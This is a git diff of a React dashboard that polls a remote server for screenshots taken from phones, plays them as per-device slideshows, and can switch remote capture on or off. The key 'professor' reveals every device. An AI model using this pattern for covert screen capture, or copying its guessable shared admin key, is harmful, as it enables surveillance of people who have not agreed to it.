@@ -533,49 +533,276 @@
 //   );
 // }
 // src/App.jsx
-import { useEffect, useState } from 'react';
+// import { useEffect, useState } from 'react';
+// import {
+//   Smartphone, Wifi, WifiOff, Clock,
+//   Eye, Monitor, Battery, Volume2
+// } from 'lucide-react';
+// import './App.css';
+
+// const BASE_URL = 'https://third-eye-txe8.onrender.com';
+
+// export default function App() {
+//   const [accessKey,   setAccessKey]   = useState(null);
+//   const [keyInput,    setKeyInput]    = useState('');
+//   const [isPosting,   setIsPosting]   = useState(false);
+//   const [devicesMap,  setDevicesMap]  = useState({});
+//   const [loading,     setLoading]     = useState(false);
+//   const [status,      setStatus]      = useState('disconnected');
+//   const [lastUpdate,  setLastUpdate]  = useState(null);
+
+//   // 1) Fetch device data every 5s
+//   useEffect(() => {
+//     if (!accessKey) return;
+
+//     async function fetchData() {
+//       try {
+//         setStatus('connecting');
+//         const res = await fetch(`${BASE_URL}/recent_background_api_data/${accessKey}`);
+//         if (!res.ok) throw new Error();
+//         const json = await res.json();
+
+//         // normalize into { uid: { data, received_at } }
+//         let map = {};
+//         if (accessKey === 'professor') {
+//           // admin sees everything
+//           map = json;
+//         } else if (json[accessKey]) {
+//           // shape: { "<uid>": {...} }
+//           map = json;
+//         } else if (json.data && json.received_at) {
+//           // shape: { data, received_at }
+//           map = { [accessKey]: json };
+//         } else {
+//           // unexpected, keep empty
+//           map = {};
+//         }
+
+//         setDevicesMap(map);
+//         setStatus('connected');
+//         setLastUpdate(new Date());
+//       } catch {
+//         setStatus('error');
+//       } finally {
+//         setLoading(false);
+//       }
+//     }
+
+//     setLoading(true);
+//     fetchData();
+//     const iv = setInterval(fetchData, 5000);
+//     return () => clearInterval(iv);
+//   }, [accessKey]);
+
+//   // 2) Toggle Start/Stop Posting
+//   const togglePosting = async () => {
+//     const enable = !isPosting;
+//     try {
+//       const res = await fetch(`${BASE_URL}/control/${accessKey}`, {
+//         method: 'POST',
+//         headers: { 'Content-Type': 'application/json' },
+//         body: JSON.stringify({ capture_enabled: enable })
+//       });
+//       if (res.ok) {
+//         setIsPosting(enable);
+//       }
+//     } catch (e) {
+//       console.error(e);
+//     }
+//   };
+
+//   // 3) Login screen
+//   if (!accessKey) {
+//     return (
+//       <div className="min-h-screen flex items-center justify-center bg-slate-900">
+//         <form
+//           onSubmit={e => { e.preventDefault(); setAccessKey(keyInput.trim()); }}
+//           className="bg-gray-800 p-8 rounded-xl shadow-lg"
+//         >
+//           <h2 className="text-white text-2xl mb-4">Enter Access Key</h2>
+//           <input
+//             type="text"
+//             value={keyInput}
+//             onChange={e => setKeyInput(e.target.value)}
+//             placeholder="Your code"
+//             className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white"
+//           />
+//           <button
+//             type="submit"
+//             className="w-full bg-purple-600 text-white py-2 rounded"
+//           >
+//             Submit
+//           </button>
+//         </form>
+//       </div>
+//     );
+//   }
+
+//   // 4) Loading state
+//   if (loading) {
+//     return (
+//       <div className="min-h-screen flex items-center justify-center bg-slate-900">
+//         <div className="text-white text-lg">Loading…</div>
+//       </div>
+//     );
+//   }
+
+//   // 5) Build a flat list of devices
+//   const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
+//     uid,
+//     ...entry.data,
+//     received_at: entry.received_at
+//   }));
+
+//   const activeCount = allDevices.filter(d =>
+//     Date.now() - new Date(d.received_at) < 30_000
+//   ).length;
+
+//   // 6) Dashboard
+//   return (
+//     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white">
+//       <header className="p-6 flex flex-col lg:flex-row items-center justify-between gap-4">
+//         <div className="flex items-center gap-3">
+//           <div className="p-3 bg-gradient-to-br from-purple-500 to-blue-600 rounded-2xl shadow-lg">
+//             <Monitor className="w-8 h-8 text-white"/>
+//           </div>
+//           <div>
+//             <h1 className="text-4xl font-black">Live Dashboard</h1>
+//             <p className="text-gray-400">{`Device: ${accessKey}`}</p>
+//           </div>
+//         </div>
+
+//         <button
+//           onClick={togglePosting}
+//           className={`px-4 py-2 rounded-full font-medium ${
+//             isPosting ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'
+//           }`}
+//         >
+//           {isPosting ? 'Stop Posting' : 'Start Posting'}
+//         </button>
+
+//         <div className="flex items-center gap-4">
+//           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 rounded-xl border border-white/10">
+//             {status === 'connecting'
+//               ? <Wifi className="w-4 h-4 animate-pulse"/>
+//               : status === 'error'
+//               ? <WifiOff className="w-4 h-4"/>
+//               : <Wifi className="w-4 h-4"/>}
+//             <span className={`text-sm font-medium ${
+//               status==='connected'  ? 'text-green-400' :
+//               status==='connecting' ? 'text-yellow-400' :
+//                                      'text-red-400'
+//             }`}>
+//               {status[0].toUpperCase() + status.slice(1)}
+//             </span>
+//           </div>
+//           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 rounded-xl border border-white/10">
+//             <Smartphone className="w-4 h-4 text-blue-400"/>
+//             <span className="text-white text-sm font-medium">
+//               {activeCount}/{allDevices.length} Active
+//             </span>
+//           </div>
+//           {lastUpdate && (
+//             <div className="flex items-center gap-2 px-4 py-2 bg-black/20 rounded-xl border border-white/10">
+//               <Clock className="w-4 h-4 text-gray-400"/>
+//               <span className="text-gray-300 text-xs">
+//                 {lastUpdate.toLocaleTimeString()}
+//               </span>
+//             </div>
+//           )}
+//         </div>
+//       </header>
+
+//       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 mt-4">
+//         {allDevices.map(d => {
+//           const isActive = Date.now() - new Date(d.received_at) < 30_000;
+//           const ts = new Date(d.received_at);
+//           return (
+//             <div
+//               key={d.uid}
+//               className="bg-black/40 rounded-2xl overflow-hidden"
+//             >
+//               <div className="p-3 flex justify-between bg-gradient-to-r from-purple-500/20 to-blue-500/20">
+//                 <span className="font-bold truncate">{d.device_name}</span>
+//                 <span className={`h-3 w-3 rounded-full ${
+//                   isActive ? 'bg-green-400' : 'bg-red-400'
+//                 }`} />
+//               </div>
+
+//               <div className="aspect-[9/16] bg-gray-900 flex items-center justify-center">
+//                 {d.screenshot_png_b64
+//                   ? <img
+//                       src={`data:image/webp;base64,${d.screenshot_png_b64}`}
+//                       alt="screenshot"
+//                       className="w-full h-full object-contain"
+//                       loading="lazy"
+//                     />
+//                   : <div className="text-gray-500 text-center px-4">
+//                       No screenshot
+//                     </div>}
+//               </div>
+
+//               <div className="p-3 bg-black/30 flex justify-between text-xs">
+//                 <span className={isActive ? 'text-green-400' : 'text-red-400'}>
+//                   {isActive ? 'Online' : 'Offline'}
+//                 </span>
+//                 <span className="text-gray-400">
+//                   {Math.round((Date.now() - ts.getTime())/1000)}s ago
+//                 </span>
+//               </div>
+//             </div>
+//           );
+//         })}
+//       </div>
+//     </div>
+//   );
+// }
+
+
+
+import { useEffect, useState, useRef } from 'react';
 import {
-  Smartphone, Wifi, WifiOff, Clock,
-  Eye, Monitor, Battery, Volume2
+  Smartphone,
+  Wifi,
+  WifiOff,
+  Clock,
+  Monitor
 } from 'lucide-react';
 import './App.css';
 
 const BASE_URL = 'https://third-eye-txe8.onrender.com';
+const SLIDE_INTERVAL_MS = 1000; // show each screenshot for 1s
 
 export default function App() {
-  const [accessKey,   setAccessKey]   = useState(null);
-  const [keyInput,    setKeyInput]    = useState('');
-  const [isPosting,   setIsPosting]   = useState(false);
-  const [devicesMap,  setDevicesMap]  = useState({});
-  const [loading,     setLoading]     = useState(false);
-  const [status,      setStatus]      = useState('disconnected');
-  const [lastUpdate,  setLastUpdate]  = useState(null);
+  const [accessKey, setAccessKey] = useState(null);
+  const [keyInput, setKeyInput] = useState('');
+  const [isPosting, setIsPosting] = useState(false);
+  const [devicesMap, setDevicesMap] = useState({});
+  const [loading, setLoading] = useState(false);
+  const [status, setStatus] = useState('disconnected');
+  const [lastUpdate, setLastUpdate] = useState(null);
 
-  // 1) Fetch device data every 5s
+  // track which slide each device is on:
+  const [currentIndices, setCurrentIndices] = useState({});
+  const slideTimers = useRef({});
+
+  // Fetch queues every 5s
   useEffect(() => {
     if (!accessKey) return;
+    let iv;
 
     async function fetchData() {
+      setStatus('connecting');
       try {
-        setStatus('connecting');
         const res = await fetch(`${BASE_URL}/recent_background_api_data/${accessKey}`);
-        if (!res.ok) throw new Error();
+        if (!res.ok) throw new Error('Fetch failed');
         const json = await res.json();
 
-        // normalize into { uid: { data, received_at } }
         let map = {};
         if (accessKey === 'professor') {
-          // admin sees everything
           map = json;
-        } else if (json[accessKey]) {
-          // shape: { "<uid>": {...} }
-          map = json;
-        } else if (json.data && json.received_at) {
-          // shape: { data, received_at }
-          map = { [accessKey]: json };
-        } else {
-          // unexpected, keep empty
-          map = {};
+        } else if (Array.isArray(json[accessKey])) {
+          map = { [accessKey]: json[accessKey] };
         }
 
         setDevicesMap(map);
@@ -590,11 +817,35 @@ export default function App() {
 
     setLoading(true);
     fetchData();
-    const iv = setInterval(fetchData, 5000);
-    return () => clearInterval(iv);
+    iv = window.setInterval(fetchData, 5000);
+    return () => window.clearInterval(iv);
   }, [accessKey]);
 
-  // 2) Toggle Start/Stop Posting
+  // Initialize slide indices & timers whenever devicesMap changes
+  useEffect(() => {
+    Object.values(slideTimers.current).forEach(id => window.clearInterval(id));
+    slideTimers.current = {};
+
+    const newIndices = {};
+    Object.entries(devicesMap).forEach(([uid, queue]) => {
+      newIndices[uid] = 0;
+      const timerId = window.setInterval(() => {
+        setCurrentIndices(prev => {
+          const max = (devicesMap[uid]?.length || 1) - 1;
+          const next = Math.min((prev[uid] || 0) + 1, max);
+          return { ...prev, [uid]: next };
+        });
+      }, SLIDE_INTERVAL_MS);
+      slideTimers.current[uid] = timerId;
+    });
+    setCurrentIndices(newIndices);
+
+    return () => {
+      Object.values(slideTimers.current).forEach(id => window.clearInterval(id));
+    };
+  }, [devicesMap]);
+
+  // Toggle Start/Stop Posting
   const togglePosting = async () => {
     const enable = !isPosting;
     try {
@@ -603,15 +854,13 @@ export default function App() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ capture_enabled: enable })
       });
-      if (res.ok) {
-        setIsPosting(enable);
-      }
+      if (res.ok) setIsPosting(enable);
     } catch (e) {
       console.error(e);
     }
   };
 
-  // 3) Login screen
+  // Login
   if (!accessKey) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-slate-900">
@@ -627,10 +876,7 @@ export default function App() {
             placeholder="Your code"
             className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white"
           />
-          <button
-            type="submit"
-            className="w-full bg-purple-600 text-white py-2 rounded"
-          >
+          <button type="submit" className="w-full bg-purple-600 text-white py-2 rounded">
             Submit
           </button>
         </form>
@@ -638,7 +884,7 @@ export default function App() {
     );
   }
 
-  // 4) Loading state
+  // Loading
   if (loading) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-slate-900">
@@ -647,108 +893,75 @@ export default function App() {
     );
   }
 
-  // 5) Build a flat list of devices
-  const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
-    uid,
-    ...entry.data,
-    received_at: entry.received_at
-  }));
+  const now = Date.now();
+  const deviceIds = Object.keys(devicesMap);
+  const activeCount = deviceIds.filter(uid => {
+    const queue = devicesMap[uid];
+    return queue.length && now - new Date(queue[queue.length - 1].receivedAt) < 30000;
+  }).length;
 
-  const activeCount = allDevices.filter(d =>
-    Date.now() - new Date(d.received_at) < 30_000
-  ).length;
-
-  // 6) Dashboard
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white">
       <header className="p-6 flex flex-col lg:flex-row items-center justify-between gap-4">
         <div className="flex items-center gap-3">
           <div className="p-3 bg-gradient-to-br from-purple-500 to-blue-600 rounded-2xl shadow-lg">
-            <Monitor className="w-8 h-8 text-white"/>
+            <Monitor className="w-8 h-8 text-white" />
           </div>
           <div>
             <h1 className="text-4xl font-black">Live Dashboard</h1>
             <p className="text-gray-400">{`Device: ${accessKey}`}</p>
           </div>
         </div>
-
         <button
           onClick={togglePosting}
-          className={`px-4 py-2 rounded-full font-medium ${
-            isPosting ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'
-          }`}
+          className={`px-4 py-2 rounded-full font-medium ${isPosting ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'}`}
         >
           {isPosting ? 'Stop Posting' : 'Start Posting'}
         </button>
-
         <div className="flex items-center gap-4">
           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 rounded-xl border border-white/10">
-            {status === 'connecting'
-              ? <Wifi className="w-4 h-4 animate-pulse"/>
-              : status === 'error'
-              ? <WifiOff className="w-4 h-4"/>
-              : <Wifi className="w-4 h-4"/>}
-            <span className={`text-sm font-medium ${
-              status==='connected'  ? 'text-green-400' :
-              status==='connecting' ? 'text-yellow-400' :
-                                     'text-red-400'
-            }`}>
-              {status[0].toUpperCase() + status.slice(1)}
-            </span>
+            {status === 'connecting' ? <Wifi className="w-4 h-4 animate-pulse" /> : status === 'error' ? <WifiOff className="w-4 h-4" /> : <Wifi className="w-4 h-4" />}
+            <span className={`text-sm font-medium ${status === 'connected' ? 'text-green-400' : status === 'connecting' ? 'text-yellow-400' : 'text-red-400'}`}> {status[0].toUpperCase() + status.slice(1)}</span>
           </div>
           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 rounded-xl border border-white/10">
-            <Smartphone className="w-4 h-4 text-blue-400"/>
-            <span className="text-white text-sm font-medium">
-              {activeCount}/{allDevices.length} Active
-            </span>
+            <Smartphone className="w-4 h-4 text-blue-400" />
+            <span className="text-white text-sm font-medium">{activeCount}/{deviceIds.length} Active</span>
           </div>
           {lastUpdate && (
             <div className="flex items-center gap-2 px-4 py-2 bg-black/20 rounded-xl border border-white/10">
-              <Clock className="w-4 h-4 text-gray-400"/>
-              <span className="text-gray-300 text-xs">
-                {lastUpdate.toLocaleTimeString()}
-              </span>
+              <Clock className="w-4 h-4 text-gray-400" />
+              <span className="text-gray-300 text-xs">{lastUpdate.toLocaleTimeString()}</span>
             </div>
           )}
         </div>
       </header>
 
       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 mt-4">
-        {allDevices.map(d => {
-          const isActive = Date.now() - new Date(d.received_at) < 30_000;
-          const ts = new Date(d.received_at);
+        {deviceIds.map(uid => {
+          const queue = devicesMap[uid];
+          const idx = currentIndices[uid] || 0;
+          const entry = queue[idx];
+          const ts = new Date(entry.receivedAt).getTime();
+          const isActive = now - ts < 30000;
+
           return (
-            <div
-              key={d.uid}
-              className="bg-black/40 rounded-2xl overflow-hidden"
-            >
+            <div key={uid} className="bg-black/40 rounded-2xl overflow-hidden">
               <div className="p-3 flex justify-between bg-gradient-to-r from-purple-500/20 to-blue-500/20">
-                <span className="font-bold truncate">{d.device_name}</span>
-                <span className={`h-3 w-3 rounded-full ${
-                  isActive ? 'bg-green-400' : 'bg-red-400'
-                }`} />
+                <span className="font-bold truncate">{entry.data.device_name}</span>
+                <span className={`h-3 w-3 rounded-full ${isActive ? 'bg-green-400' : 'bg-red-400'}`}></span>
               </div>
 
               <div className="aspect-[9/16] bg-gray-900 flex items-center justify-center">
-                {d.screenshot_png_b64
-                  ? <img
-                      src={`data:image/webp;base64,${d.screenshot_png_b64}`}
-                      alt="screenshot"
-                      className="w-full h-full object-contain"
-                      loading="lazy"
-                    />
-                  : <div className="text-gray-500 text-center px-4">
-                      No screenshot
-                    </div>}
+                {entry.data.screenshot_png_b64 ? (
+                  <img src={`data:image/webp;base64,${entry.data.screenshot_png_b64}`} alt="screenshot" className="w-full h-full object-contain" loading="lazy" />
+                ) : (
+                  <div className="text-gray-500 text-center px-4">No screenshot</div>
+                )}
               </div>
 
               <div className="p-3 bg-black/30 flex justify-between text-xs">
-                <span className={isActive ? 'text-green-400' : 'text-red-400'}>
-                  {isActive ? 'Online' : 'Offline'}
-                </span>
-                <span className="text-gray-400">
-                  {Math.round((Date.now() - ts.getTime())/1000)}s ago
-                </span>
+                <span className={isActive ? 'text-green-400' : 'text-red-400'}>{isActive ? 'Online' : 'Offline'}</span>
+                <span className="text-gray-400">{`${idx + 1}/${queue.length}`}</span>
               </div>
             </div>
           );
